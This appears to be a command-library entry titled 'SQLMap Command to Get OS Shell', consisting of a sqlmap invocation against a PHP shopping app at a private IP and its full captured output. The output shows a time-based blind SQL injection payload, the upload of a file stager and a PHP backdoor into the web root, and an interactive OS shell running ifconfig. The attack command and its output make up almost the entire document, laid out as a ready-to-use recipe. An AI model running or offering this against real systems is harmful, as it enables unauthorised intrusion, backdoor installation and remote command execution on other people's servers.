---
id: 60ea05f0-461a-4e15-82c8-e321984dde06
name: SQLMap Command to Get OS Shell
type: command
executor: ''
data: sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --os-shell
output: "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [(]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 00:09:05\n\n\
  [00:09:05] [WARNING] provided value for parameter 'term' is empty. Please, always\
  \ use only valid parameter values so sqlmap could be able to run properly\n[00:09:05]\
  \ [INFO] testing connection to the target URL\nsqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[00:09:07] [INFO] testing MySQL\n[00:09:07] [INFO] confirming\
  \ MySQL\n[00:09:07] [INFO] the back-end DBMS is MySQL\nweb application technology:\
  \ Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)\n[00:09:07]\
  \ [INFO] going to use a web backdoor for command prompt\n[00:09:07] [INFO] fingerprinting\
  \ the back-end DBMS operating system\n[00:09:07] [INFO] the back-end DBMS operating\
  \ system is Linux\nwhich web application language does the web server support?\n\
  [1] ASP\n[2] ASPX\n[3] JSP\n[4] PHP (default)\n> 4\ndo you want sqlmap to further\
  \ try to provoke the full path disclosure? [Y/n] y\n[00:09:14] [WARNING] unable\
  \ to automatically retrieve the web server document root\nwhat do you want to use\
  \ for writable directory?\n[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs,\
  \ /var/www/nginx-default, /srv/www') (default)\n[2] custom location(s)\n[3] custom\
  \ directory list file\n[4] brute force search\n> 2\nplease provide a comma separate\
  \ list of absolute directory paths: /Applications/XAMPP/htdocs/vcart\n[00:09:59]\
  \ [WARNING] unable to automatically parse any web server path\n[00:09:59] [INFO]\
  \ trying to upload the file stager on '/Applications/XAMPP/htdocs/vcart/' via LIMIT\
  \ 'LINES TERMINATED BY' method\n[00:09:59] [INFO] the file stager has been successfully\
  \ uploaded on '/Applications/XAMPP/htdocs/vcart/' - http://192.168.43.68:80/vcart/tmpuyfaw.php\n\
  [00:09:59] [INFO] the backdoor has been successfully uploaded on '/Applications/XAMPP/htdocs/vcart/'\
  \ - http://192.168.43.68:80/vcart/tmpblbdc.php\n[00:09:59] [INFO] calling OS shell.\
  \ To quit type 'x' or 'q' and press ENTER\nos-shell> ifconfig\ndo you want to retrieve\
  \ the command standard output? [Y/n/a] y\ncommand standard output:\n---\nlo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST>\
  \ mtu 16384\n\toptions=1203<RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP>\n\tinet 127.0.0.1\
  \ netmask 0xff000000 \n\tinet6 ::1 prefixlen 128 \n\tinet6 fe80::1%lo0 prefixlen\
  \ 64 scopeid 0x1 \n\tnd6 options=201<PERFORMNUD,DAD>\ngif0: flags=8010<POINTOPOINT,MULTICAST>\
  \ mtu 1280\nstf0: flags=0<> mtu 1280\nen0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST>\
  \ mtu 1500\n\toptions=400<CHANNEL_IO>\n"
created_at: '2020-08-19T19:11:03.473595+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command to Get OS Shell

```bash
sqlmap --dbms=mysql -u '192.168.43.68/vcart/search.php?term=' --os-shell
```

## Expected Output

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:09:05

[00:09:05] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[00:09:05] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[00:09:07] [INFO] testing MySQL
[00:09:07] [INFO] confirming MySQL
[00:09:07] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[00:09:07] [INFO] going to use a web backdoor for command prompt
[00:09:07] [INFO] fingerprinting the back-end DBMS operating system
[00:09:07] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
[00:09:14] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 2
please provide a comma separate list of absolute directory paths: /Applications/XAMPP/htdocs/vcart
[00:09:59] [WARNING] unable to automatically parse any web server path
[00:09:59] [INFO] trying to upload the file stager on '/Applications/XAMPP/htdocs/vcart/' via LIMIT 'LINES TERMINATED BY' method
[00:09:59] [INFO] the file stager has been successfully uploaded on '/Applications/XAMPP/htdocs/vcart/' - http://192.168.43.68:80/vcart/tmpuyfaw.php
[00:09:59] [INFO] the backdoor has been successfully uploaded on '/Applications/XAMPP/htdocs/vcart/' - http://192.168.43.68:80/vcart/tmpblbdc.php
[00:09:59] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> ifconfig
do you want to retrieve the command standard output? [Y/n/a] y
command standard output:
---
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384
	options=1203<RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP>
	inet 127.0.0.1 netmask 0xff000000 
	inet6 ::1 prefixlen 128 
	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
	nd6 options=201<PERFORMNUD,DAD>
gif0: flags=8010<POINTOPOINT,MULTICAST> mtu 1280
stf0: flags=0<> mtu 1280
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	options=400<CHANNEL_IO>

```
